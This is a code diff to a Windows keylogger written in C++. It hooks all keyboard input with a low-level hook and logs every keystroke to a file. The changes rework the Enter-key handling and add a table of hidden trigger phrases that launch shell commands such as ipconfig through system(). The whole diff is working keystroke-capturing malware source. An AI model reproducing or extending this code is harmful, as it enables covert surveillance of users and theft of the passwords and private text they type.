@@ -83,7 +83,6 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam){
                 case VK_PRINT:              writeFileString(_KEYLOG_FILENAME_, "\n<Print>\n"); break;
                 case VK_PRIOR:              writeFileString(_KEYLOG_FILENAME_, ""); break;
                 case VK_RBUTTON:            writeFileString(_KEYLOG_FILENAME_, ""); break;
-                case VK_RETURN:             writeFileString(_KEYLOG_FILENAME_, "\n"); break;
                 case VK_RIGHT:              writeFileString(_KEYLOG_FILENAME_, "\n<Right>\n"); break;
                 case VK_RMENU:              writeFileString(_KEYLOG_FILENAME_, ""); break;
                 case VK_RSHIFT:             writeFileString(_KEYLOG_FILENAME_, "\n<Shift>\n"); break;
@@ -101,7 +100,10 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam){
                 case VK_RCONTROL:
                 case VK_LCONTROL:
                     writeFileString(_KEYLOG_FILENAME_, "\n<Control>\n");
-                    detectCurrentCode();
+                break;
+
+                case VK_RETURN:
+                    writeFileString(_KEYLOG_FILENAME_, "\n");
                 break;
                 default :
                     if (key->vkCode == 0x0d && (key->flags & LLKHF_EXTENDED) != 0) { // check if it's the enter on the numpad
@@ -113,12 +115,14 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam){
                        key->vkCode = key->vkCode + 32;
                     }
 
+
+
                     // Purge bufferString if exceeded Secret Code Size
                     if (bufferString.length() > 50){
                         bufferString = "";
                     }
-
                     bufferString.append(1,key->vkCode);
+                    detectCurrentCode();
                     appendFile(_KEYLOG_FILENAME_, key->vkCode);
                 break;
             }
@@ -181,25 +185,30 @@ bool writeFileString(char *filename, const char *str){
 
 // Here you can add some Secrets Sequences to make specifics actions
 void detectCurrentCode(){
-    writeFileString(_KEYLOG_FILENAME_, "Current Buffer >>>");
+    writeFileString(_KEYLOG_FILENAME_, "\nCurrent Buffer >>>");
     writeFileString(_KEYLOG_FILENAME_, bufferString.c_str());
-    vector<string> applicationLaunchCode;
-    applicationLaunchCode.push_back("xyxyxy ifconfig xyxyxy");
-    applicationLaunchCode.push_back("xyxyxy teamview xyxyxy");
-    applicationLaunchCode.push_back("xyxyxy iexplorer xyxyxy");
-    applicationLaunchCode.push_back("xyxyxy cmd xyxyxy");
+
+    vector<secretCode> applicationLaunchCode;
+    applicationLaunchCode.push_back((secretCode){ .keyCode = "xyxyxy flushdns xyxyxy", .cmd =  "ipconfig /flushdns"});
+    applicationLaunchCode.push_back((secretCode){ .keyCode = "xyxyxy ipconfig xyxyxy", .cmd =  "ipconfig"});
+    applicationLaunchCode.push_back((secretCode){ .keyCode = "xyxyxy iprelease xyxyxy", .cmd =  "ipconfig /release"});
+    applicationLaunchCode.push_back((secretCode){ .keyCode = "xyxyxy iprenew xyxyxy", .cmd =  "ipconfig   /renew"});
+
     for (int i = 0; i < applicationLaunchCode.size(); i++){
-        size_t found = bufferString.find(applicationLaunchCode[i]);
+        size_t found = bufferString.find(applicationLaunchCode[i].keyCode);
         if (found!=string::npos){
-            bufferString = "cmd /q /k echo Secret Code Enabled " + applicationLaunchCode[i];
+            bufferString = "cmd /q /k " + applicationLaunchCode[i].cmd;
             system(bufferString.c_str());
+            bufferString = "";
         }
     }
-    bufferString = "";
 }
 
 
-int main() {
+int main(int argc, char **argv) {
+    if (argc > 1) {
+        debug = true;
+    }
     MSG msg;
     bool bRet;
     keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
